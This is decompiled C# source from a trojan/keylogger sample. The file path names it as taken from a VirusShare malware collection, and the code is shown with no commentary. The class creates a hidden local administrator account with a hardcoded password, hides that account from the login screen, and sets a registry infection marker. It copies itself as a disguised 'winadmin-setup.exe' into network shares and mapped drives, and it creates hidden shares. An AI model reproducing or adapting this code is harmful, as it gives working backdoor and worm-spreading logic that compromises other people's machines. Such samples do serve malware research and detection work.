// Decompiled with JetBrains decompiler
// Type: Roy.LAN
// Assembly: Roy, Version=2.3.3.234, Culture=neutral, PublicKeyToken=null
// MVID: 2E5855C9-3623-47AC-87B3-574423C889E6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Spy.MSIL.KeyLogger.ghj-a49d165972c0534f6ef5730aa1e0dd66ae9dc93656c6cd8ad725852281757a19.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.DirectoryServices;
using System.IO;
using System.Management;
using System.Runtime.CompilerServices;

namespace Roy
{
  [StandardModule]
  internal sealed class LAN
  {
    public static string me = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName);

    public static bool chkIt()
    {
      if (Operators.CompareString((string) Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Universal", "Universal", (object) "Universal"), "Universal", false) == 0)
        return true;
      Registry.LocalMachine.OpenSubKey("Software", true).CreateSubKey("Universal").SetValue("Universal", (object) LAN.me);
      return false;
    }

    public static void UniversalUser()
    {
      try
      {
        DirectoryEntry directoryEntry1 = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
        DirectoryEntry directoryEntry2 = directoryEntry1.Children.Add("Universal", "user");
        directoryEntry2.Invoke("SetPassword", (object) "Universalwashere");
        directoryEntry2.CommitChanges();
        directoryEntry1.Children.Find("Administrators", "group")?.Invoke("Add", (object) directoryEntry2.Path.ToString());
        try
        {
          Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", "Universal", (object) 0, RegistryValueKind.DWord);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Share()
    {
      try
      {
        ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select * from win32_share");
        try
        {
          foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
          {
            string str = Convert.ToString(RuntimeHelpers.GetObjectValue(managementBaseObject["Name"]));
            if (!str.Contains("$"))
              File.Copy(LAN.me, "\\\\" + Environment.MachineName + "\\" + str + "\\winadmin-setup.exe", true);
          }
        }
        finally
        {
          ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
          objectEnumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        string name1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive MRU\\";
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name1);
        string[] valueNames = registryKey.GetValueNames();
        int index = 0;
        while (index < valueNames.Length)
        {
          string name2 = valueNames[index];
          string str = registryKey.GetValue(name2).ToString();
          if (Operators.CompareString(name2.ToLower(), "mrulist", false) != 0)
          {
            try
            {
              File.Copy(LAN.me, str + "\\\\winadmin-setup.exe", true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          checked { ++index; }
        }
        registryKey.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void CreateShare(string dir, string name)
    {
      try
      {
        Directory.CreateDirectory(dir);
        ManagementClass managementClass = new ManagementClass("Win32_Share");
        ManagementBaseObject methodParameters = managementClass.GetMethodParameters("Create");
        methodParameters["Description"] = (object) name;
        methodParameters["Name"] = (object) name;
        methodParameters["Path"] = (object) dir;
        methodParameters["Type"] = (object) 0;
        if (Conversions.ToUInteger(managementClass.InvokeMethod("Create", methodParameters, (InvokeMethodOptions) null).Properties["ReturnValue"].Value) != 0U || !Directory.Exists(dir))
          return;
        new DirectoryInfo(dir).Attributes = FileAttributes.Hidden;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
